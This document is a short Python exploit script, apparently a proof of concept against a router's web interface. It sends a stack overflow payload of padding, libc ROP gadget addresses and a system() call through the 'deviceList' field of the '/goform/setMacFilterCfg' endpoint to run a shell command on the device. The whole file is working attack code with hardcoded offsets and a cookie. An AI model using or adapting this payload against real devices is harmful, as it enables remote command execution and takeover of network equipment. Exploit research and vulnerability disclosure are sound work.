#!/usr/bin/python
#coding:utf-8
import requests
from pwn import *

cmd="echo hello"
libc_base = 0xff58c000
system_offset = 0x5a270
gadget1_offset = 0x18298
gadget2_offset = 0x40cb8
system_addr = libc_base + system_offset
gadget1 = libc_base + gadget1_offset
gadget2 = libc_base + gadget2_offset

payload = "A"*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd

url = "http://172.17.0.222/goform/setMacFilterCfg"
cookie = {"Cookie":"password=12345"}
data = {"macFilterType": "white", "deviceList": "r"+payload}
requests.post(url, cookies=cookie, data=data)
